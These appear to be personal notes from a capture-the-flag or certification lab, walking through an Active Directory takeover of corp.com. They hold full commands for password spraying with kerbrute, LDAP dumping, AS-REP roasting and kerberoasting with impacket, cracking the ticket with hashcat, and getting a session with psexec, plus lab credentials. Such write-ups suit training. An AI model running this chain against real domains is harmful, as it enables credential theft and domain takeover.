- Starting credential pair is password `VimForPowerShell123!` with possible users being either `meg` or `backupuser`.
- Using `kerbrute passwordspray --dc 192.168.226.70 domainUsers.txt VimForPowerShell123\!` to spray the known password and find out `meg` to be the user of the password.![[Pasted image 20240209073601.png]]
- Again enumerate `smb` and `rdp` access of `meg` using `netexec`. In this case, it seems that `meg` is not a local administrator of any computer. ![[Pasted image 20240209074120.png]]
- Then, run `ldapdomaindump --no-json --no-grep ldap://192.168.224.70 -u "corp.com\meg" -p VimForPowerShell123\!` to gain more situational awareness within the domain environment. One can see that `backupuser` is one of the `Domain Admins`.![[Pasted image 20240209074618.png]]
- Let's continue by enumerate `AS-REP roastable` and `kerberoastable` accounts to find more potential footholds:
	1. `impacket-GetNPUsers -dc-ip 192.168.224.70 corp.com/meg:VimForPowerShell123\! -request -outputfile asreproast.hash`![[Pasted image 20240209074212.png]]
	2. `impacket-GetUserSPNs -dc-ip 192.168.224.70 corp.com/meg:VimForPowerShell123\! -request -outputfile kerberoast.hash`![[Pasted image 20240209074301.png]]
- Looks like `http/files04.corp.com` is registered under the account `backupuser` which allows use to perform `kerberoasting`. Run `hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt -r myrule --force` to identify the plaintext password of  `backupuser` as `DonovanJadeKnight1`.![[Pasted image 20240209075052.png]]
- Run `psexec` to get a C2 session and retrieve the flag.